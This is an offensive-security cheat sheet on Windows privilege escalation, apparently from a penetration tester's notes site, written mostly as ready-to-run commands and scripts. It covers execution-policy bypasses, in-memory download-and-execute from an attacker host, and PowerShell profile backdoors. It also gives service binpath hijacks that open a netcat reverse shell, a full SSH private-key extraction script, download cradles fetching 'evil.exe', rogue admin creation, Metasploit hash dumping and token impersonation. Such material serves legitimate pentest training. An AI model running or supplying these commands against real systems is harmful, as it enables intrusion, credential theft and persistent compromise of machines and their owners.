# Privilege Escalation

## Privilege Escalation

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents. You accept full responsibility for your actions by applying any knowledge gained here.
{% endhint %}

### PowerShell Script Execution Policy Bypass Methods

| Bypass Method                                                                                                                                                                           | Description                                                                                                                                                                                                              |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `Set-Executionpolicy Bypass`                                                                                                                                                            | Administrator rights are required.                                                                                                                                                                                       |
| `Set-ExecutionPolicy -Scope CurrentUser Bypass`                                                                                                                                         | Only works in the context of the current user but requires no Administrator rights.                                                                                                                                      |
| <ol><li>Open .ps1 file in text editor.</li><li>Copy all text in the file</li><li>Paste into PowerShell</li></ol>                                                                        | PowerShell will run each line of the script one at a time, essentially the same as running the script.                                                                                                                   |
| `Echo <script_code> \| PowerShell.exe -noprofile -`                                                                                                                                     | Similar to simply pasting the code.                                                                                                                                                                                      |
| `cat $script.ps1 \| PowerShell.exe -noprofile -`                                                                                                                                        | Effectively the same as the previous example, but the code is read from a script file instead of being pasted. `cat` is an alias for `Get-Content`.                                                                      |
| `function <name> { <code_here> }`                                                                                                                                                       | Similar to the above examples, however you paste your code inside the curly braces, and run the code by typing the `<name>` of your function. Allows for **code reuse without having to copy and paste multiple times.** |
| `PowerShell.exe -command "<code_here>"`                                                                                                                                                 | Runs the string provided to the `-c` (Command) argument as code.                                                                                                                                                         |
| `cat $script.ps1 \| IEX`                                                                                                                                                                | Pipes the content of the script to the `Invoke-Expression` cmdlet, which runs any specified string as a command and returns the results to the console. `IEX` is an alias for `Invoke-Expression`.                       |
| `IEX { <code_here> }`                                                                                                                                                                   | Essentially creates a one-time use function from your code.                                                                                                                                                              |
| `& { <code_here> }`                                                                                                                                                                     | The operator (`&`) is an alias for `Invoke-Expression` and is equivalent to the example above.                                                                                                                           |
| `. { <code_here> }`                                                                                                                                                                     | The operator (`.`) can be used to create an anonymous one-time function. This can sometimes be used to bypass certain constrained language modes.                                                                        |
| <p><code>$text = Get-Content $text_file -Raw</code></p><p><code>$script = [System.Management.Automation.ScriptBlock]::Create($text)</code></p><p></p><p><code>&#x26; $script</code></p> | Using the .NET object `System.Management.Automation.ScriptBlock` we can compile and text content to a script block. Then, using (`&`) we can easily execute this compiled and formatted text file.                       |
| `Echo IEX(New-Object Net.WebClient).DownloadString(http://$ip:$port/$filename.ps1) \| PowerShell -NoProfile -`                                                                          | Download script from attacker's machine, then run in PowerShell, in memory. No files are written to disk.                                                                                                                |

#### Other Bypass Methods

**Execute .ps1 scripts on compromised machine: in memory and other bypass methods**

If you are able to use `Invoke-Expression` (`IEX`) you can execute remote scripts using the following command. You can also copy and paste the functions into your PowerShell session, so any functions become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory.

```powershell
IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ip/$script.ps1")
```

This can also be done from a .bat script by calling `powershell.exe`.

```shell
powershell.exe -nop -c "IEX (New-Object -TypeName Net.WebClient).downloadString('http://$attacker_ip/$script.ps1")'
```

`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as EDR. Downloading files to a target's machine is not always allowed in a penetration test, so another method to use is `Invoke-Command`. This can be done using the following format.

```powershell
Invoke-Command -ComputerName $computer -FilePath .'\$module.ps1m' -Credential (Get-Credential)
```

This will execute the file and its contents on the remote computer.

Another sneaky method would be to have the script load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.  The example script below can do this.

```powershell
Write-Verbose "Creates powershell profile for user"
New-Item -Path $PROFILE -ItemType File -Force
<#
The $PROFILE vaiable will be either:
    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
OR
    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
depending on whether OneDrive is in use or not.
#>
<#
Running scripts in the PowerShell profile will import all of the commands 
everytime the backdoored user opens a PowerShell session. This means you will 
need to open a new powershell session after doing this in order to access 
the commands. I assume this can be done by just executing the "powershell" 
command though you may need to have a new window opened or new reverse/bind 
shell opened. You can also just reload the profile
#>

cmd /c 'copy \\$attacker_ip>\$script.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1

powershell.exe

# If this does not work try reloading the user profile.
& $PROFILE
```

#### Run script code as a function

Running the code from your PowerShell script inside a function will completely bypass script execution policies. Other code protection policies such as JEA may still stop certain cmdlets and code from running, however.

```powershell
function $function_name {

#code goes here

}
```

Then you can re-use the code by just typing the function name.

### Sudo for Windows

There may be times when you know the credentials for another user, but can't spawn other windows. The `sudo` equivalent in PowerShell on Windows machines is the verb `RunAs`. It is not as simple to use as `sudo`, however.

#### runas

First run `cmdkey /list`. If this returns entries, it means that you may able to `runas` a certain user who stored their credentials in Windows.

```
runas /savecred /user:$domain\$username $command_to_run
```

This can be used in either cmd.exe or PowerShell.

#### runas PowerShell

Use the below PowerShell script to run commands as another user.

```powershell
$secPassword = ConvertTo-SecureString "$password" -AsPlainText -Force
$myCreds = New-Object System.Management.Automation.PSCredential ("$userName", $secpasswd)

[System.Diagnostics.Process]::Start("$command", $myCreds.Username, $myCreds.Password, $computerName)
```

Needs a `password`, `username`, `command`, and `computername` specified in this example, which runs `$command` as the specified user.

## PowerShell `sudo` script

https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions

Below is a PowerShell script that that will run a separate file as another user. You can then run a batch file, PowerShell script, or just execute a meterpreter binary as that user. The below function is to be run from a PowerShell prompt:

```powershell
function sudo {

param(
[Parameter (Mandatory = $true)] [String]$UserName,
[Parameter (Mandatory = $false)] [String]$DomainName,
[Parameter (Mandatory = $false)] [String]$Password,
[Parameter (Mandatory = $true)] [String]$Script,
[System.Management.Automation.PSCredential]$Credential
)

#hard-coded $Password can be sniffed, beware
#$pw = ConvertTo-SecureString "$Password" -AsPlainText -Force
#$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$DomainName\$UserName",$pw

<#
Using the $Credential parameter below allows for Windows to prompt for credentials.  
Use the above lines if a password needs to be passed in the command line.
#>

Start-Process Powershell -Credential $Credential -ArgumentList '-NoProfile -Command &{Start-Process $Script -verb RunAs}'
}
```

Example: `sudo -UserName Administrator -Script C:\tmp\privesc.ps1` This will cause Windows to prompt for a password for the Administrator user, then run the privesc script. Can be used to run a command rather than a script.

Running this in a function will bypass Script Execution policies, though JEA may still give you trouble.

### Services

#### Modify service binary path (_link to_ [_persistence_](persistence.md#windows-services) _page_)

If one of the groups you have access to has **`SERVICE_ALL_ACCESS`** in a service, then it can modify the binary that is being executed by the service. To modify it and execute nc you can do:

```
sc.exe config $service_Name binpath= "C:\nc.exe -nv $ip $port -e C:\WINDOWS\System32\cmd.exe"

#use SYSTEM privileged service to add your user to administrators group
sc.exe config $service_Name binpath= "net localgroup administrators <username> /add"

#replace executable with your own binary (best to only do this for unused services!)
sc.exe config $service_name binpath= "C:\path\to\backdoor.exe"
```

#### Service Permissions

Other Permissions can be used to escalate privileges:

* `SERVICE_CHANGE_CONFIG`: Can reconfigure the service binary
* `WRITE_DAC`: Can reconfigure permissions, leading to `SERVICE_CHANGE_CONFIG`
* `WRITE_OWNER`: Can become owner, reconfigure permissions
* `GENERIC_WRITE`: Inherits `SERVICE_CHANGE_CONFIG`
* `GENERIC_ALL`: Inherits `SERVICE_CHANGE_CONFIG`(To detect and exploit this vulnerability you can use `exploit/windows/local/service_permissions` in MetaSploit)

Check if you can modify the binary that is executed by a service. You can retrieve a list of every binary that is executed by a service using `wmic` (not in system32) and check your permissions using `icacls`:

```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

You can also use `sc.exe` and `icacls`:

```
sc.exe query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

#### Services registry permissions (TODO: _link to persistence pages_)

You should check if you can modify any service registry. You can check your permissions over a service registry doing:

```
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Check if Authenticated Users or NT AUTHORITY\INTERACTIVE have `FullControl`. In that case you can change the binary that is going to be executed by the service. To change the Path of the binary executed: `reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f`

#### Unquoted Service Paths (TODO: _link to persistence pages_)

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space. For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:

```
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
```

To list all unquoted service paths (minus built-in Windows services)

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services
```

\-or-

```
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
    for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
        echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
    )
)
```

\-also-

```
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

You can detect and exploit this vulnerability with metasploit using the module: `exploit/windows/local/trusted_service_path` You can manually create a service binary with msfvenom: `msfvenom -p windows/exec CMD="net localgroup administrators $username /add" -f exe-service -o service.exe`

### Extract SSH Keys using PowerShell and Python

* [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

```csharp
$path = "HKCU:\Software\OpenSSH\Agent\Keys\"

$regkeys = Get-ChildItem $path | Get-ItemProperty

if ($regkeys.Length -eq 0) {
    Write-Host "No keys in registry"
    exit
}

$keys = @()

Add-Type -AssemblyName System.Security;

$regkeys | ForEach-Object {
    $key = @{}
    $comment = [System.Text.Encoding]::ASCII.GetString($_.comment)
    Write-Host "Pulling key: " $comment
    $encdata = $_.'(default)'
    $decdata = [Security.Cryptography.ProtectedData]::Unprotect($encdata, $null, 'CurrentUser')
    $b64key = [System.Convert]::ToBase64String($decdata)
    $key[$comment] = $b64key
    $keys += $key
}

ConvertTo-Json -InputObject $keys | Out-File -FilePath './extracted_keyblobs.json' -Encoding ascii
Write-Host "extracted_keyblobs.json written. Use Python script to reconstruct private keys: python extractPrivateKeys.py extracted_keyblobs.json"
```

First run this as a PowerShell function, then use the Python script below to parse and decrypt the JSON

```python
#!/usr/bin/env python

# Script to extract OpenSSH private RSA keys from base64 data
# Original implementation and all credit due to this script by soleblaze: 
# https://github.com/NetSPI/sshkey-grab/blob/master/parse_mem.py

import sys
import base64
import json
try:
    from pyasn1.type import univ
    from pyasn1.codec.der import encoder
except ImportError:
    print("You must install pyasn1")
    sys.exit(0)

def extractRSAKey(data):
    keybytes = base64.b64decode(data)
    offset = keybytes.find(b"ssh-rsa")
    if not offset:
        print("[!] No valid RSA key found")
        return None
    keybytes = keybytes[offset:]

    # This code is re-implemented code originally written by soleblaze in sshkey-grab
    start = 10
    size = getInt(keybytes[start:(start+2)])
    # size = unpack_bigint(keybytes[start:(start+2)])
    start += 2
    n = getInt(keybytes[start:(start+size)])
    start = start + size + 2
    size = getInt(keybytes[start:(start+2)])
    start += 2
    e = getInt(keybytes[start:(start+size)])
    start = start + size + 2
    size = getInt(keybytes[start:(start+2)])
    start += 2
    d = getInt(keybytes[start:(start+size)])
    start = start + size + 2
    size = getInt(keybytes[start:(start+2)])
    start += 2
    c = getInt(keybytes[start:(start+size)])
    start = start + size + 2
    size = getInt(keybytes[start:(start+2)])
    start += 2
    p = getInt(keybytes[start:(start+size)])
    start = start + size + 2
    size = getInt(keybytes[start:(start+2)])
    start += 2
    q = getInt(keybytes[start:(start+size)])

    e1 = d % (p - 1)
    e2 = d % (q - 1)

    keybytes = keybytes[start+size:]

    seq = (
        univ.Integer(0),
        univ.Integer(n),
        univ.Integer(e),
        univ.Integer(d),
        univ.Integer(p),
        univ.Integer(q),
        univ.Integer(e1),
        univ.Integer(e2),
        univ.Integer(c),
    )

    struct = univ.Sequence()

    for i in range(len(seq)):
        struct.setComponentByPosition(i, seq[i])
    
    raw = encoder.encode(struct)
    data = base64.b64encode(raw).decode('utf-8')

    width = 64
    chopped = [data[i:i + width] for i in range(0, len(data), width)]
    top = "-----BEGIN RSA PRIVATE KEY-----\n"
    content = "\n".join(chopped)
    bottom = "\n-----END RSA PRIVATE KEY-----"
    return top+content+bottom

def getInt(buf):
    return int.from_bytes(buf, byteorder='big')

def run(filename):
    with open(filename, 'r') as fp:
        keysdata = json.loads(fp.read())
    
    for jkey in keysdata:
        for keycomment, data in jkey.items():
            privatekey = extractRSAKey(data)
            print("[+] Key Comment: {}".format(keycomment))
            print(privatekey)
            print()
    
    sys.exit(0)


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: {} extracted_keyblobs.json".format(sys.argv[0]))
        sys.exit(0)
    filename = sys.argv[1]
    run(filename)
```

## File Transfers

### Using FTP

Windows has an FTP client built in at `C:\Windows\System32\ftp.exe` that is already in PATH. You can open an FTP connection and download the files directly from Kali on the command line. To do this, you can authenticate with user `anonymous` and any password, or if FTP account information is known, use that. Windows FTP can take a “script” of commands directly from the command line. This means if you have a text file called `ftp_commands.txt` on the system that contains this:

```
open 10.10.10.10
anonymous
anythingoeshere
binary
get $file_to_download
bye
```

Then you can simply run `ftp -s:ftp_commands.txt` and download a file with no user interaction.  Use **`-i`** to disable interactive prompting during multiple file transfers.

#### FTP **batch script example**

```
echo "open <IP>" > ftp_commands.txt
echo "username" >> ftp_commands.txt
echo "password" >> ftp_commands.txt
echo "binary" >> ftp_commands.txt

echo "get <file1.exe>" >> ftp_commands.txt
echo "put <file2.exe>" >> ftp_commands.txt

echo "bye" >> ftp_commands.txt

ftp -s:ftp_commands.txt
```

Use "**`Get`**" if downloading, or "**`Put`**" if uploading.&#x20;

### Download files with PowerShell

**Using System.Net.WebClient**

```powershell
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.26/shell.ps1', 'shell.ps1')
```

**Using Invoke-WebRequest**

```powershell
Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1' -OutFile 'shell.ps1'
```

**Download and Execute in Memory**

```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
```

**Using .Net:**

```powershell
$url = "http://10.10.10.10/evil.exe"
$file = "evil.exe"

# Add the necessary .NET assembly
Add-Type -AssemblyName System.Net.Http

# Create the HttpClient object
$client = New-Object -TypeName System.Net.Http.Httpclient
$task = $client.GetAsync($url)
$task.wait();
[io.file]::WriteAllBytes($file, $task.Result.Content.ReadAsByteArrayAsync().Result)
```

### **Using Bitsadmin**

```
bitsadmin /transfer WindowsUpdate /download /priority normal http:///$ip/$file C:\\Users\\%USERNAME%\\AppData\\local\\temp\\$file
```

### **Using Certutil**

```
certutil.exe -urlcache -split -f "http://$ip/$file" $file
```

```bash
set url=https://www.nsa.org/content/hl-images/2017/02/09/NSA.jpg
set file=file.jpg
certutil -urlcache -split -f %url% %file%
#Or
certutil.exe -verifyctl -f -split %url% %file%
```

### Using Microsoft Defender MpCmdRun.exe

* [https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/](https://winaero.com/beware-microsoft-defender-mpcmdrun-exe-tool-can-be-used-to-download-files/)

```
MpCmdRun.exe -DownloadFile -url $url_of_file -path $out_file_path
```

Also: See APT writeup for how to use this tool to retrieve machine account hash for total pwnage!

### C# Command-line build with csc.exe:

* [https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/command-line-building-with-csc-exe)

```csharp
using System;
using System.IO;

using System.Net.Http;
using System.Threading.Tasks;

namespace DownloadImage
{
    class Program
    {
        static async Task Main(string[] args)
        {
            using var httpClient = new HttpClient();
            var url = "http://10.10.10.10/evil.exe";
            byte[] imageBytes = await httpClient.GetByteArrayAsync(url);

            using var fs = new FileStream("evil.exe", FileMode.Create);
            fs.Write(imageBytes, 0, imageBytes.Length);

        }
    }
}
```

## **Users**

#### **Add User**

```
net user hacker hack3dpasswd /add
```

#### **Make User Admin**

```
net localgroup administrators hacker /add
```

#### Get all members of "Domain Admins" group

```
net group "Domain Admins" /domain
```

#### Password brute force/domain user enumeration (kerbrute)

* [https://github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)

#### Dump password hashes (Metasploit)

```
msf > run post/windows/gather/smart_hashdump GETSYSTEM=FALSE
```

####

Find admin users (Metasploit)

```
spool /tmp/enumdomainusers.txt
msf > use auxiliary/scanner/smb/smb_enumusers_domain
msf > set smbuser Administrator
msf > set smbpass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf > set rhosts 10.10.10.0/24
msf > set threads 8
msf > run

msf> spool off
```

#### Impersonate an administrator (meterpreter)

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token MYDOM\\adaministrator
meterpreter > getuid
meterpreter > shell
```

#### Add a user

```
C:\> net user hacker /add /domain
C:\> net group "Domain Admins" hacker /add /domain
```

### Covert to and from Base64 with PowerShell

**Convert to base64**

```powershell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('whoami'))
# d2hvYW1p
```

**Convert from base64**

```powershell
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))
# whoami
```

**Execute a base64 payload in powershell**

```powershell
powershell.exe -command "[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('d2hvYW1p'))"
# hostname\username
```

### Using `Runas` to execute commands as another user

{% tabs %}
{% tab title="PowerShell" %}
First you have to create a credential object, and specify the computer to connect to. Can be used both locally and remotely.

```powershell
$passwd = ConvertTo-SecureString "$Password" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("$UserName", $passwd)
$computer = "$ComputerName"
[System.Diagnostics.Process]::Start("$Commands", $creds.Username, $creds.Password, $computer)
```
{% endtab %}

{% tab title="cmd.exe" %}
First, list available credentials using `cmdkey`, then use a saved credential from the list.

```bash
cmdkey /list
runas /savecred /user:$user $command
```

**Using runas.exe with known credentials**

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:$UserName $Password "$Commands"
```

**Using PsExec.exe with known credentials**

```bash
PsExec.exe -u $hostname\$UserName -p $Password "$Commands"
```
{% endtab %}
{% endtabs %}

### **AlwaysInstall Elevated**

Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`. To check for this, query the **`AlwaysInstallElevated`** property of the **`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`** registry key

{% tabs %}
{% tab title="PowerShell" %}
#### Using PowerShell drives:

```powershell
#Query whether the key exists or not
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer'
#-or-
Get-ItemProperty -Path Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer

#Read the value of the AlwaysInstallElevated property
Get-ItemPropertyValue -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated
```

####

#### Using .Net:

1. Open the registry on the remote computer.

```powershell
$Registry = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $Computername)
```

2\. Open the **`SOFTWARE\Policies\Microsoft\Windows\Installer`** registry key.

```powershell
$RegistryKey = $Registry.OpenSubKey("SOFTWARE\Policies\Microsoft\Windows\Installer", $true)
```

3\. Use the **`GetValue()`** method to query the value of the registry key.

```powershell
$RegistryKey.GetValue('AlwaysInstallElevated')
```

Using .NET rather than PowerShell drives (as above) is a bit faster and is an easy way to query registry keys and values on remote computers.
{% endtab %}

{% tab title="cmd.exe" %}
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
{% endtab %}
{% endtabs %}

**msfvenom**

```
msfvenom -p windows/adduser USER=bhanu PASS=bhanu123 -f msi -o create_user.msi
```

**msiexec (on victim machine)**

```
msiexec /quiet /qn /i C:\create_user.msi
```

**Metasploit module**

```
use exploit/windows/local/always_install_elevated
```

### References

* [http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled](http://vcloud-lab.com/entries/powershell/different-ways-to-bypass-powershell-execution-policy-ps1-cannot-be-loaded-because-running-scripts-is-disabled) - [@KunalAdapi](https://twitter.com/kunalUdapi)
* [https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
* [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
* [https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools](https://stackoverflow.com/questions/28143160/how-can-i-download-a-file-with-batch-file-without-using-any-external-tools)
* [https://adamtheautomator.com/powershell-get-registry-value/](https://adamtheautomator.com/powershell-get-registry-value/)

If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
